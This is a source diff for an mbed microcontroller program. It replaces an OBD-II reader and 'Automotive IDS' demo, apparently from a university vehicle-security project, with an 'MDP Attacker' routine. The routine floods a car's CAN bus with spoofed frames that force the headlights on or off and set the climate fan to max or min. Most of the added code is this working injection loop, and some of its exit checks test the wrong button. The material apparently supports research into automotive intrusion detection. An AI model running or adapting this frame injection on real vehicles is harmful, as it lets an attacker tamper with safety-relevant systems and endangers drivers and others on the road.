@@ -1,131 +1,101 @@
-/*
-
-mbed Can-Bus demo
-
-This program is to demonstrate the CAN-bus capability of the mbed module.
-
-http://www.skpang.co.uk/catalog/product_info.php?products_id=741
-
-v1.0 July 2010
-
-********************************************************************************
-
-WARNING: Use at your own risk, sadly this software comes with no guarantees.
-This software is provided 'free' and in good faith, but the author does not
-accept liability for any damage arising from its use.
-
-********************************************************************************
-
-
-*/
-
 #include "mbed.h"
-#include "ecu_reader.h"
 #include "globals.h"
+#include "TextLCD.h"
 
-ecu_reader obdii(CANSPEED_500);     //Create object and set CAN speed
-void sd_demo(void);
+void attacks(void);
 
 int main() {
     pc.baud(115200);
-    char buffer[20];
-    
+    can2.frequency(CANSPEED_500);
+
     //Enable Pullup 
     click.mode(PullUp);
     right.mode(PullUp);
     down.mode(PullUp);
     left.mode(PullUp);
     up.mode(PullUp);
-    
-    //printf("Automotive IDS \n"); 
-    lcd.locate(0,0);                // Set LCD cursor position
-    lcd.printf("Automotive IDS");
-    
-    lcd.locate(0,1);
-    lcd.printf("UMTRI");
-       
-    pc.printf("\n\rAutomotive IDS initializing...");
-    
-    wait(3);
-    lcd.cls();
-    lcd.printf("Use joystick");
 
-    lcd.locate(0,1);
-    lcd.printf("U-CAN:L-SD");
-    
-    pc.printf("\nU-CAN:L-SD");
+    lcd.locate(0,0); 
+    printf("MDP Attacker \n"); 
 
-    while(1)    // Wait until option is selected by the joystick
-    {
-   
-        if(left == 0) sd_demo();
-               
-        if(up == 0) break;
-        
-    }
-    lcd.cls();
-
-    while(1) {  // Main CAN loop
-        led2 = !led2;
-        wait(0.1);
-        led2 = !led2;
-        wait(0.1);
-        
-        if(obdii.request(ENGINE_RPM,buffer,NULL,NULL,NULL) == 1)   // Get engine rpm and display on LCD
-        {
-            lcd.locate(0,0);
-            lcd.printf(buffer);
-            pc.printf(buffer);
-        }   
-         
-        if(obdii.request(ENGINE_COOLANT_TEMP,buffer,NULL,NULL,NULL) == 1)
-        {
-            lcd.locate(9,0);
-            lcd.printf(buffer);
-        }
-        
-        if(obdii.request(VEHICLE_SPEED,buffer,NULL,NULL,NULL) == 1)
-        {
-            lcd.locate(0,1);
-            lcd.printf(buffer);
-        }
-     
-        if(obdii.request(THROTTLE,buffer,NULL,NULL,NULL) ==1 )
-        {
-            lcd.locate(9,1);
-            lcd.printf(buffer);          
-        }   
-       
-    }
+    attacks();
 }
 
-void sd_demo(void)
-{
-    lcd.cls();
-     printf("\nSD demo");
-    lcd.printf("SD demo");
-    wait(2);      
-    lcd.cls();
-    
-    FILE *fp = fopen("/sd/sdtest2.txt", "w");
-    if(fp == NULL) {
-        lcd.cls();
-        lcd.printf("Could not open file for write\n");
-         pc.printf("\nCould not open file for write");
-    }
-    fprintf(fp, "Hello fun SD Card World! testing 1234");
-    fclose(fp); 
-    lcd.locate(0,1);
-    lcd.printf("Writtern to SD card");
-    pc.printf("\nWrittern to SD card");
-        
-    while(1)
-    {
-        led2 = 1;
-        wait(0.1);
-        led2 = 0;
-        wait(0.1);
-   
-    }
- 
+int send(unsigned int id, unsigned char  data[8]) {
+    if (can2.write(CANMessage(id, reinterpret_cast<const char*>(data), 8))) return true;
+    return false;
+}
+
+void attacks(void){
+	lcd.printf("Test attacks to run\n");
+	pc.printf("\n up/down for headlights, left/right for fan");
+	wait(1);
+	while(1)
+		{
+			lcd.locate(0,0);
+			if(down == 0){
+				//Force headlights off
+				while(1){
+					unsigned char message[8] = {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+					if(send(0x3BB, message))
+						//lcd.printf("Force headlights off");
+					    pc.printf("Force headlight off");
+					else{
+						//lcd.printf("Can't send message FHOf");
+						pc.printf("Can't send message FHOf");
+						break;
+					}
+					wait(0.1);
+					if(down == 0)
+						break;
+				}
+			}
+			if(right == 0){
+				//Set fan to max
+				while(1){
+					unsigned char message[8] = {0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00};
+					if(send(0x356, message))
+						lcd.printf("Fan to max");
+					else{
+						lcd.printf("Can't send message fan max");
+						break;
+					}
+					wait(0.1);
+					if(right == 0)
+						break;
+					}
+				}
+			if(left == 0){
+				//Set fan to min
+				while(1){
+					unsigned char message[8] = {0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00};
+					if(send(0x356, message))
+						lcd.printf("Fan to min");
+					else{
+						lcd.printf("Can't send message fan min");
+						break;
+					}
+					wait(0.1);
+					if(right == 0)
+						break;
+					}
+				}				
+			if(up == 0){
+				//Force headlights on
+				while(1){
+					unsigned char message[8] = {0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+					if(send(0x3BB, message))
+						lcd.printf("Force headlights on");
+					else{
+						lcd.printf("Can't send message FHO");
+						break;
+					}
+					wait(0.1);
+					if(right == 0)
+						break;
+					}
+				}
+			if(click == 0)
+				break;
+			}
 }
